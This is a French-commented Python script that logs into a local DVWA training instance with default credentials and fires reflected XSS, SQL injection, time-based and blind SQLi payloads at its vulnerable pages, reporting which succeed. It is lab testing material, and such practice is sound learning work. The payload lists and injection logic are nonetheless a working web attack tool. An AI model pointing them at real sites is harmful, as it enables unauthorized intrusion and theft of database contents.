#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Sat May 16 08:16:32 2026

@author: hounsousamuel
"""

#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Test spécifique XSS et SQLi sur DVWA
"""

import asyncio
import aiohttp
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# Configuration
DVWA_URL = "http://localhost:8081"
USERNAME = "admin"
PASSWORD = "password"

# Payloads XSS simples
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "'><script>alert(1)</script>",
    "\"><script>alert(1)</script>",
]

# Payloads SQLi simples
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "admin' --",
    "' UNION SELECT 1,2,3--",
    "1' AND SLEEP(5)--",
]


async def dvwa_login(session):
    """Login à DVWA"""
    login_url = urljoin(DVWA_URL, "login.php")
    
    # Récupérer le token
    async with session.get(login_url) as resp:
        html = await resp.text()
        soup = BeautifulSoup(html, 'html.parser')
        token_input = soup.find('input', {'name': 'user_token'})
        user_token = token_input['value'] if token_input else ''
    
    # Login
    data = {
        'username': USERNAME,
        'password': PASSWORD,
        'Login': 'Login',
        'user_token': user_token
    }
    
    async with session.post(login_url, data=data) as resp:
        return resp.status == 200 and 'Login failed' not in await resp.text()


async def test_xss(session):
    """Test XSS sur DVWA"""
    print("\n🔴 TEST XSS")
    print("=" * 50)
    
    # Page XSS réfléchi
    xss_url = urljoin(DVWA_URL, "/vulnerabilities/xss_r/")
    
    found = []
    for payload in XSS_PAYLOADS:
        params = {'name': payload}
        async with session.get(xss_url, params=params) as resp:
            html = await resp.text()
            
            # Vérifier si le payload est réfléchi
            if payload in html or payload.replace('<', '&lt;') in html:
                found.append(payload)
                print(f"  ✅ XSS trouvé: {payload[:40]}...")
            else:
                print(f"  ❌ XSS échoué: {payload[:40]}...")
    
    print(f"\n📊 Résultat XSS: {len(found)}/{len(XSS_PAYLOADS)} payloads réussis")
    return found


async def test_sqli(session):
    """Test SQLi sur DVWA"""
    print("\n🔵 TEST SQL INJECTION")
    print("=" * 50)
    
    # Page SQLi
    sqli_url = urljoin(DVWA_URL, "/vulnerabilities/sqli/")
    
    found = []
    for payload in SQLI_PAYLOADS:
        params = {'id': payload, 'Submit': 'Submit'}
        
        start = asyncio.get_event_loop().time()
        async with session.get(sqli_url, params=params) as resp:
            html = await resp.text()
            elapsed = asyncio.get_event_loop().time() - start
            
            # Indicateurs SQLi
            is_sql_error = any([
                "You have an error in your SQL syntax" in html,
                "mysql_fetch" in html,
                "SQL syntax" in html,
                "Warning: mysql" in html,
                "Unclosed quotation mark" in html,
                "First name" in html and "Surname" in html,  # Succès union
            ])
            
            # Time-based detection
            is_time_based = elapsed > 1.0 and "SLEEP" in payload.upper()
            
            if is_sql_error or is_time_based:
                found.append(payload)
                print(f"  ✅ SQLi trouvé: {payload[:40]}... (temps: {elapsed:.2f}s)")
            else:
                print(f"  ❌ SQLi échoué: {payload[:40]}...")
    
    print(f"\n📊 Résultat SQLi: {len(found)}/{len(SQLI_PAYLOADS)} payloads réussis")
    return found


async def test_sqli_blind(session):
    """Test SQLi Blind sur DVWA"""
    print("\n🟡 TEST SQLI BLIND")
    print("=" * 50)
    
    blind_url = urljoin(DVWA_URL, "/vulnerabilities/sqli_blind/")
    
    # Payloads pour blind
    blind_payloads = [
        ("1' AND '1'='1", True),   # Devrait retourner vrai
        ("1' AND '1'='2", False),  # Devrait retourner faux
    ]
    
    results = {}
    for payload, expected in blind_payloads:
        params = {'id': payload, 'Submit': 'Submit'}
        async with session.get(blind_url, params=params) as resp:
            html = await resp.text()
            
            # Vérifier la présence de "User ID exists"
            exists = "User ID exists" in html
            results[payload] = exists
            print(f"  Payload: {payload:30} → {'✅ Existe' if exists else '❌ N existe pas'} (attendu: {expected})")
    
    return results


async def main():
    print("\n" + "=" * 60)
    print("🎯 TEST XSS ET SQLi SUR DVWA")
    print("=" * 60)
    
    async with aiohttp.ClientSession() as session:
        # Login
        print("\n🔐 Authentification...")
        if not await dvwa_login(session):
            print("❌ Login échoué")
            return
        
        print("✅ Login réussi")
        
        # Tests
        xss_results = await test_xss(session)
        sqli_results = await test_sqli(session)
        blind_results = await test_sqli_blind(session)
        
        # Résumé
        print("\n" + "=" * 60)
        print("📊 RÉSUMÉ FINAL")
        print("=" * 60)
        print(f"XSS  : {len(xss_results)}/{len(XSS_PAYLOADS)} payloads réussis")
        print(f"SQLi : {len(sqli_results)}/{len(SQLI_PAYLOADS)} payloads réussis")
        
        if xss_results:
            print(f"\n✅ XSS détectable avec payloads: {xss_results[:2]}")
        if sqli_results:
            print(f"✅ SQLi détectable avec payloads: {sqli_results[:2]}")


if __name__ == "__main__":
    import nest_asyncio
    nest_asyncio.apply()
    asyncio.run(main())